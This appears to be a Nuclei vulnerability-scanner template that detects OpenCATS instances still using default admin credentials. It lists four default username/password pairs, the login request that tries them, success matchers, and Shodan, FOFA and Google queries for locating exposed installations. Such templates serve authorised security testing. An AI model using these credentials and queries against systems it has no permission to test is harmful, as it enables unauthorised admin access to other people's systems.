id: opencats-default-login

info:
  name: OpenCATS - Default Login
  author: arafatansari
  severity: high
  description: |
    OpenCATS default login credentials were discovered.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:opencats:opencats:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: opencats
    product: opencats
    shodan-query: http.title:"opencats"
    fofa-query: title="opencats"
    google-query: intitle:"opencats"
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)opencats"})
  tags: default-login,opencats

http:
  - raw:
      - |
        POST /index.php?m=login&a=attemptLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
        - cats@rootadmin
        - john@mycompany.net
        - username
      password:
        - admin
        - cats
        - password
        - john99
    host-redirects: true
    max-redirects: 2

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '<title>OpenCATS - Home</title>'
          - 'CATS Administrator'
          - 'Dashboard'
        condition: and

      - type: status
        status:
          - 200

